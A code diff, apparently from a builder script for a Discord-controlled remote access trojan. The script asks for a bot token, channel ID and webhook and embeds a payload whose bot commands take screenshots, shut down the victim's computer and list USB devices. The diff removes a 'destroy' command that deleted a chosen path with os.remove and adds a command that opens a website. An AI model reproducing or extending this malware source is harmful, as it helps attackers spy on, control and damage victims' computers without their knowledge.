@@ -13,7 +13,7 @@ downloads_path = "C:/Users/%s/Downloads/" % username
 token = input("token of ur bot                                           [+]")
 idchannel = input("if of channel you want receive the ping                                           [+]")
 webhoooks = input("webhook                                           [+]")
-pathuwantdestroy = input("put ur path u wan't destroy with the commmand                                           [+]")
+
 content = r"""
 import ctypes
 import os
@@ -102,7 +102,7 @@ async def help(ctx):
     em.add_field(name = "``screenshot``", value = "to take a screenshot")
     em.add_field(name = "``shutdown``", value = "to shutdown ur computer")
     em.add_field(name = "``usbinfo``", value = "to show usb connect")
-    em.add_field(name = "``destroy``", value = "to delete ur file")
+    em.add_field(name = "``play``", value = "open website")
     await ctx.send(embed = em)
 @bot.command()
 async def usbinfo(ctx):
@@ -112,11 +112,7 @@ async def usbinfo(ctx):
         usbem = discord.Embed(title = "usb info :", description = usb.DeviceID)
         await ctx.send(embed = usbem)
 
-@bot.command()
-async def destroy(ctx):
-    os.remove('""" + pathuwantdestroy + r"""')
-    delete = discord.Embed(title = "Ur path was deleted")
-    await ctx.send(embed = delete)
+
 
 
 @bot.command()
